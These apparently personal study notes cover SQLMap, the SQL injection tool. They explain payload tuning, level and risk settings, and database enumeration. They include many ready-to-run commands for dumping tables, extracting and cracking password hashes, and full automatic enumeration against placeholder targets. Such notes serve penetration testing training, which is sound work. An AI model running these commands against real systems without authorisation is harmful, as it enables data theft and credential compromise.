# SQLMap: Attack Tuning and Fine-Tuning Parameters

SQLMap offers advanced customization to improve injection accuracy and adapt to edge cases. This section explains techniques for fine-tuning attacks and adjusting detection heuristics.
#### Payload Structure

Each SQLMap payload contains two core elements:

- **Vector:** The main SQL code to be injected (e.g., `UNION ALL SELECT 1,2,VERSION()`).    
- **Boundaries:** Injection wrappers like prefix/suffix (e.g., `%'))` and `-- -`).

#### Prefix and Suffix

Used when default boundaries do not fit the SQL query format at the target.

Example:

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Injected query at target:

```sql
SELECT id,name FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -'))
```
#### Level and Risk

- `--level` (1-5): Controls quantity/diversity of vectors and boundaries.
- `--risk` (1-3): Controls payloads with higher potential for impact.

Example:

```bash
sqlmap -u www.example.com/?id=1 --level=5 --risk=3 -v 3
```

At high values, SQLMap tests a broader set of payloads (up to 7,865 per param).

Default `--level=1` and `--risk=1` uses ~72 payloads.
#### Advanced Fine-Tuning Options

**1. HTTP Response Tuning**

- `--code=200`: Fix TRUE response by HTTP code.
- `--string="success"`: Match TRUE response using specific string.
- `--titles`: Match TRUE/FALSE via HTML content.
- `--text-only`: Compare response by visible text (ignores tags).

**2. SQLi Technique Filtering**

- `--technique=BEU`: Use only Boolean, Error, and Union-based (exclude time/stacks).
- `--no-cast` disables automatic data type conversions in SQLMap payloads to avoid breaking queries in fragile or strict environments. Use it if SQLMap struggles retrieving data despite a confirmed injection.

**3. UNION SQLi Enhancements**

- `--union-cols=5`: Manually set number of columns. 
- `--union-char='a'`: Override default NULL filler.
- `--union-from=users`: Add FROM clause manually for DBs like Oracle.
#### Key Takeaway

Use tuning options only when default detection fails or for special query formats. Increased levels enhance detection but slow down execution.

**Common Example**

```bash
sqlmap -u "http://site.com/page.php?id=1" --level=5 --risk=3 --technique=BEU --string="Welcome" -v 3
```

This command maximizes payloads, filters only Boolean/Error/Union injections, matches based on the word "Welcome", and provides detailed debug output.

# Database Enumeration with SQLMap

Enumeration is a core phase in SQLi exploitation. Once exploitability is confirmed, SQLMap is used to extract database information systematically.
### Basic Enumeration Switches

- `--banner` → DBMS version info (e.g., `VERSION()`)    
- `--current-user` → Current database user (e.g., `CURRENT_USER()`)
- `--current-db` → Current database in use (e.g., `DATABASE()`)
- `--is-dba` → Checks if user has DBA privileges

**Example:**

```bash
sqlmap -u "http://target.com/?id=1" --banner --current-user --current-db --is-dba
```
### Table Discovery

- `--tables` → Lists tables in the specified database
- `-D <dbname>` → Specify the database name

**Example:**

```bash
sqlmap -u "http://target.com/?id=1" --tables -D testdb
```
### Data Dumping

- `--dump` → Dumps all data from the specified table    
- `-T <table>` → Specify the table
- `-D <dbname>` → Specify the database

**Example:**

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb
```

**Dump Specific Columns:**

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb -C name,surname
```

**Dump Specific Row Range:**

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

**Dump with WHERE condition:**

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
### Full DB or Global Dumping

- `--dump -D <dbname>` → Dump all tables of a specific DB
- `--dump-all` → Dump entire contents of all DBs    
- `--exclude-sysdbs` → Skip system DBs (recommended for `--dump-all`)

**Example:**

```bash
sqlmap -u "http://target.com/?id=1" --dump-all --exclude-sysdbs
```
### Output Options

- Default output format: CSV   
- Alternative formats:
    - `--dump-format=html`
    - `--dump-format=sqlite`
### Notes

- Blind SQLi: data retrieved bit-by-bit using `LIMIT` and `OFFSET`    
- Inband SQLi: direct retrieval via `UNION` or error-based techniques
- Results stored at: `~/.local/share/sqlmap/output/<target>/dump/`

Use these switches to customize your enumeration based on access level, target DBMS, and goal (e.g., user discovery, password dumping, schema mapping).
# Advanced Database Enumeration with SQLMap

This section covers deeper enumeration strategies in SQLMap to extract sensitive or complex data structures.
### DB Schema Enumeration

- `--schema` → Retrieves structure (column names/types) of all tables across databases

**Example:**

```bash
sqlmap -u "http://target.com/?id=1" --schema
```
### Search for Tables and Columns

Use `--search` to locate tables or columns by keyword:

**Search Tables:**

```bash
sqlmap -u "http://target.com/?id=1" --search -T user
```

**Search Columns:**

```bash
sqlmap -u "http://target.com/?id=1" --search -C pass
```
### Password Hash Retrieval and Cracking

Once passwords are identified in a table:

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D master
```

SQLMap will:

- Detect hash format automatically    
- Prompt for dictionary-based cracking

**Default dictionary:** `/usr/local/share/sqlmap/data/txt/wordlist.tx_`

**Features:**

- Multi-core cracking    
- 30+ hash types supported
- Optionally use common suffixes
### Enumerating DBMS-Level User Passwords

- `--passwords` → Attempts to dump password hashes from system tables
- `--batch` → Auto-confirms all prompts (non-interactive)

**Example:**

```bash
sqlmap -u "http://target.com/?id=1" --passwords --batch
```

Cracked passwords (if successful) are shown with usernames. Output is stored at:

```
~/.local/share/sqlmap/output/<target>/
```
### Full Auto Enumeration

- `--all` → Performs full enumeration (schemas, tables, users, data)   
- Combine with `--batch` to avoid interactive prompts

**Example:**

```bash
sqlmap -u "http://target.com/?id=1" --all --batch
```

> ⚠️ This can be **very time-consuming**, especially on large databases.

These advanced enumeration techniques help uncover deeper layers of the application, including credentials and structural insights, critical for post-exploitation analysis.
## Additional Flags
- `--no-cast`: This option disables automatic type casting of data. When enabled, `sqlmap` tries to cast data types (e.g., converting strings to integers), which might not be necessary or could lead to incorrect results. Disabling it can sometimes provide more accurate outcomes.
- `--dbms=MySQL`: This flag specifies the database management system to target. By setting it to `MySQL`, you instruct `sqlmap` to use techniques specifically for exploiting MySQL databases.
- `--technique=T`: This option tells sqlmap to use only the “time-based blind” SQL injection technique for testing. The “T” represents time-based blind SQL injection, which relies on the time it takes to receive a response to infer information about the database.
- `--time-sec=10`: Sets the number of seconds to wait before considering a response to be delayed. In this case, sqlmap will wait for 10 seconds to determine if the server is responding slowly, which helps in time-based SQL injection techniques.
- `--level=5`: This option sets the level of tests to perform. Levels range from 1 to 5, with level 5 being the most thorough. It increases the number of tests that sqlmap conducts, which can lead to a better chance of discovering vulnerabilities.
- `--risk=3`: Sets the risk level for tests. Risk levels range from 0 to 3, with 3 being the highest. Higher risk levels enable more aggressive tests, which may be more likely to exploit vulnerabilities.
- `--fresh-queries`: This flag tells sqlmap to ignore cached data and to re-execute all queries against the database. This ensures that any changes to the database since the last query execution are accounted for.
# Tags
> #Exploitation #Service-Exploitation #MySQL #SQLmap #SQL-injection